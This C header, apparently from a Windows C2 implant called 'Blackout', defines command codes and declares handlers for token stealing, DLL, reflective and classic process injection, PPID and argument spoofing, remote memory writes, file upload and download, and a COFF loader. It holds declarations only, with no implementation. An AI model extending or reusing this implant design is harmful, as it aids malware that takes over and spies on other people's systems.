#include <windows.h>
#include <communication.h>

#define BLACKOUT_ERROR           0x099
#define BLACKOUT_CHECKIN         0x055
#define BLACKOUT_DEBUG           0x066

#define COMMAND_REGISTER         0x100
#define COMMAND_GET_JOB          0x101
#define COMMAND_NO_JOB           0x102

#define COMMAND_SLEEP            0x111
#define COMMAND_RUN              0x120
#define COMMAND_PPID             0x121
#define COMMAND_BLOCKDLLS        0x122
#define COMMAND_ARGUE            0x123
#define COMMAND_UPLOAD           0x130
#define COMMAND_DOWNLOAD         0x140
#define COMMAND_CLASSIC          0x151

#define COMMAND_TOKEN            0x190
#define CMD_COFFLOADER           0x500
#define CMD_DLLINJECTION         0x501
#define CMD_REFLECTION           0x502

#define COMMAND_EXITP            0x160
#define COMMAND_EXITT            0x161
#define COMMAND_PROCLIST         0x170
#define COMMAND_EXPLORER         0x180

#define COMMAND_MEMORY           0x300

#define COMMAND_OUTPUT           0x200

typedef enum _EXPLR {
    LS  = 0x181,
    CD  = 0x182,
    PWD = 0x183,
    CAT = 0x184
} M_EXPLR;

typedef enum _MEM {
    ALLOC   = 0x301,
    WRITE   = 0x302,
    PROTECT = 0x303,
    QUERY   = 0x304
} M_MEM;

typedef enum _TOKEN {
    STEAL = 0x191,
    MAKE  = 0x192,
    UID   = 0x193
} M_TOKEN;

typedef struct
{
    INT ID;
    VOID ( *Function ) ( PPARSER Arguments );
} BLACKOUT_COMMAND;

// Functions
VOID CommandDispatcher();

VOID CmdDllInjection( PPARSER Parser );
VOID CmdReflectiveInjection( PPARSER Parser );
VOID CmdCheckin( PPARSER Parser );
VOID CmdRun( PPARSER Parser );
VOID CmdExplorer( PPARSER Parser );
VOID CmdSleep( PPARSER Parser );
VOID CmdExitProcess( PPARSER Parser );
VOID CmdExitThread( PPARSER Parser );
VOID CmdMemory( PPARSER Parser );
VOID CmdInjectionClassic( PPARSER Parser );
VOID CmdProcEnum( PPARSER Parser );
VOID CmdCoffLoader( PPARSER Parser );
